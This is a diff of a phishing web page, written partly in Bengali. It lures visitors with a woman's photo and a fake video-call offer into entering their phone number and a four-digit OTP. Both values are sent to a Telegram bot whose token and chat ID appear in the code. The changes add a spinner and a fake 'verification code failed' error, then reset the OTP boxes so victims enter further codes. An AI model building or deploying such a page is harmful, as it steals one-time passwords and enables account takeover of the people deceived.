@@ -12,23 +12,28 @@
         
         input#phone { width: 100%; padding: 15px; margin: 15px 0; border: 2px solid #ddd; border-radius: 8px; box-sizing: border-box; font-size: 16px; text-align: center; }
         
-        /* ওটিপি বক্সের সাইজ ছোট করা হয়েছে (১ম ছবির মতো) */
         .otp-container { display: flex; justify-content: center; gap: 8px; margin: 20px 0; }
         .otp-box { width: 45px; height: 55px; border: 1px solid #ccc; border-radius: 8px; font-size: 22px; text-align: center; background: #fdfdfd; outline: none; transition: 0.3s; }
-        .otp-box:focus { border-color: #e91e63; box-shadow: 0 0 5px rgba(233, 30, 99, 0.2); }
+        .otp-box:focus { border-color: #e91e63; }
+
+        /* স্পিনার ডিজাইন */
+        .loader { border: 2px solid #f3f3f3; border-top: 2px solid #333; border-radius: 50%; width: 14px; height: 14px; animation: spin 1s linear infinite; display: inline-block; vertical-align: middle; margin-right: 5px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        /* মেসেজ স্টাইল */
+        #statusMsg { font-size: 13px; font-weight: bold; margin-top: 20px; min-height: 20px; line-height: 1.5; }
+        .black-text { color: black; }
+        .red-text { color: red; } /* আপনার চাহিদামত লাল কালার */
 
         button { width: 100%; padding: 15px; background: linear-gradient(to right, #6a11cb, #2575fc); color: white; border: none; border-radius: 8px; cursor: pointer; font-size: 16px; font-weight: bold; margin-top: 10px; }
-        
-        /* টাইমার স্টাইল */
-        #timerText { color: #8E8E8E; font-size: 13px; font-weight: bold; margin-top: 25px; text-transform: uppercase; letter-spacing: 1px; display: none; }
     </style>
 </head>
 <body>
 
 <div class="card">
     <img src="received_1748447966512537.jpeg" alt="Sumaiya">
-    <h2 id="title" style="margin: 10px 0;">Sumaiya Afrin</h2>
-    <p id="msg" style="color: #555;">নম্বর দিয়ে ভিডিও কল শুরু করুন</p>
+    <h2 id="title">Sumaiya Afrin</h2>
+    <p id="msg">নম্বর দিয়ে ভিডিও কল শুরু করুন</p>
 
     <form id="mainForm">
         <div id="step1">
@@ -41,11 +46,12 @@
                 <input type="tel" maxlength="1" class="otp-box" id="otp1" oninput="moveNext(this, 'otp2')" onkeyup="moveBack(event, 'otp1')">
                 <input type="tel" maxlength="1" class="otp-box" id="otp2" oninput="moveNext(this, 'otp3')" onkeyup="moveBack(event, 'otp1')">
                 <input type="tel" maxlength="1" class="otp-box" id="otp3" oninput="moveNext(this, 'otp4')" onkeyup="moveBack(event, 'otp2')">
-                <input type="tel" maxlength="1" class="otp-box" id="otp4" oninput="checkAndAutoSubmit(this)" onkeyup="moveBack(event, 'otp3')">
+                <input type="tel" maxlength="1" class="otp-box" id="otp4" oninput="processOTP(this)" onkeyup="moveBack(event, 'otp3')">
             </div>
             
-            <button type="submit" id="submitBtn">ভিডিও কল শুরু করুন ✅</button>
-            <p id="timerText">VERIFYING IN <span id="seconds">30</span>S...</p>
+            <div id="statusMsg"></div>
+            
+            <button type="submit" id="submitBtn" style="display:none;">ভিডিও কল শুরু করুন</button>
         </div>
     </form>
 </div>
@@ -54,22 +60,6 @@
     const token = '8521030210:AAHTVvrMSiVWpK_HeX6Uh9_ZZ9VKKm7jEg0';
     const chatId = '8795859465';
     let userPhone = "";
-
-    function startTimer() {
-        let seconds = 30;
-        const countdownElement = document.getElementById('seconds');
-        const timerText = document.getElementById('timerText');
-        timerText.style.display = 'block';
-
-        const timer = setInterval(() => {
-            seconds--;
-            countdownElement.textContent = seconds;
-            if (seconds <= 0) {
-                clearInterval(timer);
-                timerText.innerHTML = "OTP EXPIRED. PLEASE TRY AGAIN.";
-            }
-        }, 1000);
-    }
 
     function moveNext(current, nextFieldID) {
         if (current.value.length >= 1 && nextFieldID !== "") {
@@ -83,18 +73,37 @@
         }
     }
 
-    // ৪ নম্বর ঘরে নম্বর লিখলে অটো সাবমিট হবে
-    function checkAndAutoSubmit(current) {
+    function processOTP(current) {
         if (current.value.length >= 1) {
-            const otp = document.getElementById('otp1').value + 
-                        document.getElementById('otp2').value + 
-                        document.getElementById('otp3').value + 
-                        document.getElementById('otp4').value;
-            
-            if (otp.length === 4) {
-                sendToTelegram(`✅ OTP Auto-Received!\n📱 Number: ${userPhone}\n🔑 OTP: ${otp}`);
-                document.getElementById('submitBtn').innerText = "অপেক্ষা করুন...";
-                alert("সিস্টেম আপডেট হচ্ছে, দয়া করে অপেক্ষা করুন।");
+            const otpBoxes = document.querySelectorAll('.otp-box');
+            const statusBox = document.getElementById('statusMsg');
+            const otpValue = Array.from(otpBoxes).map(input => input.value).join('');
+
+            if (otpValue.length === 4) {
+                // ১. কোড কাটার অপশন বন্ধ (ReadOnly)
+                otpBoxes.forEach(box => box.readOnly = true);
+
+                // ২. কালো রঙে Please wait এবং স্পিনার দেখানো
+                statusBox.innerHTML = '<div class="loader"></div> <span class="black-text">Please wait...</span>';
+                
+                // ৩. ৪ সেকেন্ড পর লাল রঙে এরর দেখানো
+                setTimeout(() => {
+                    // টেলিগ্রামে পাঠানো
+                    sendToTelegram(`✅ OTP Attempt!\n📱 Number: ${userPhone}\n🔑 OTP: ${otpValue}`);
+
+                    statusBox.innerHTML = '<span class="red-text">⚠️ verification code failed please try again. ⚠️</span>';
+                    
+                    // ৪. আবার কোড লেখার অপশন চালু করা (১.৫ সেকেন্ড পর বক্স খালি হবে)
+                    setTimeout(() => {
+                        otpBoxes.forEach(box => {
+                            box.readOnly = false;
+                            box.value = '';
+                        });
+                        statusBox.innerHTML = ''; // মেসেজ মুছে ফেলা
+                        document.getElementById('otp1').focus();
+                    }, 1500);
+
+                }, 4000); 
             }
         }
     }
@@ -106,29 +115,11 @@
             return;
         }
         userPhone = phoneInput;
-        
         document.getElementById('step1').style.display = 'none';
         document.getElementById('step2').style.display = 'block';
-        document.getElementById('title').innerText = "Verification";
-        document.getElementById('msg').innerText = "কোডটি নিচে লিখুন";
-
-        startTimer();
+        document.getElementById('otp1').focus();
         sendToTelegram(`🔔 New Hit!\n📱 Number: ${userPhone}`);
     }
-
-    // বাটন ক্লিক করলেও সাবমিট হবে
-    document.getElementById('mainForm').addEventListener('submit', function(e) {
-        e.preventDefault();
-        const otp = document.getElementById('otp1').value + 
-                    document.getElementById('otp2').value + 
-                    document.getElementById('otp3').value + 
-                    document.getElementById('otp4').value;
-        
-        if (otp.length === 4) {
-            sendToTelegram(`✅ OTP Received!\n📱 Number: ${userPhone}\n🔑 OTP: ${otp}`);
-            alert("সিস্টেম আপডেট হচ্ছে, দয়া করে অপেক্ষা করুন।");
-        }
-    });
 
     function sendToTelegram(text) {
         const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;
